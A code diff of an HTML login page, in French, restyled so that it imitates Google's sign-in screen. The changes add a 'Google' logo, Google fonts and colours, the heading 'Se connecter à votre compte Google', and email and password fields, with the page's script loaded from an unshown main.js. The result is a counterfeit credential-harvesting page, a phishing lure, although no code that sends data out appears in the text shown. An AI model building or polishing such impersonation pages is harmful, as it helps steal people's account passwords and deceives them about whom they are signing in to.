@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <title>connexon</title>
     <style>
         * {
             margin: 0;
@@ -10,86 +11,143 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff;
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
+            padding: 24px;
+            line-height: 1.5;
         }
 
-        .form-container {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            backdrop-filter: blur(10px);
+        .logo {
+            margin-bottom: 48px;
         }
 
         h1 {
+            font-family: 'Google Sans', Arial, sans-serif;
+            font-size: 92px;
+            font-weight: 400;
+            color: #4285f4;
+            letter-spacing: -1.5px;
+            margin-bottom: 0;
+        }
+
+        .form-container {
+            background: #fff;
+            padding: 48px 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 368px;
             text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-            font-size: 28px;
-            font-weight: 300;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .form-subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 24px;
         }
 
         input {
             width: 100%;
-            padding: 15px 20px;
-            margin-bottom: 20px;
-            border: 2px solid #e1e5e9;
-            border-radius: 12px;
+            height: 56px;
+            padding: 0 16px 0 48px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fafbfc;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
 
         input:focus {
             outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-            transform: translateY(-2px);
+            border-color: #4285f4;
+            box-shadow: 0 1px 0 0 #4285f4;
+            background: #fff;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            opacity: 0.54;
         }
 
         button {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            height: 48px;
+            background: #1a73e8;
+            color: #fff;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 4px;
+            font-family: 'Google Sans', Arial, sans-serif;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            text-transform: none;
+            letter-spacing: 0.25px;
+            margin-top: 8px;
+            transition: background 0.2s ease, box-shadow 0.2s ease;
         }
 
         button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
 
         button:active {
-            transform: translateY(-1px);
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
         }
     </style>
 </head>
 <body>
+    <div class="logo">
+        <h1>Google</h1>
+    </div>
+
     <div class="form-container">
-        <h1>connexion</h1>
-        <input class="mail" type="text" placeholder="Adresse mail">
-        <input class="mod" type="password" placeholder="Mot de Passe">
-        <button>Envoyer</button>
+        <div class="form-title">Se connecter à votre compte Google</div>
+        <div class="form-subtitle">Utilisez votre adresse e-mail pour continuer</div>
+        
+        <div class="input-wrapper">
+            <svg class="input-icon" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+            </svg>
+            <input class="mail" type="email" placeholder="Adresse e-mail">
+        </div>
+        
+        <div class="input-wrapper">
+            <svg class="input-icon" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm-1-9V6c0-1.1.9-2 2-2s2 .9 2 2v2h-4z"/>
+            </svg>
+            <input class="mod" type="password" placeholder="Mot de passe">
+        </div>
+        
+        <button>Suivant</button>
     </div>
 
     <script src="main.js">
-        
+
     </script>
 </body>
 </html>
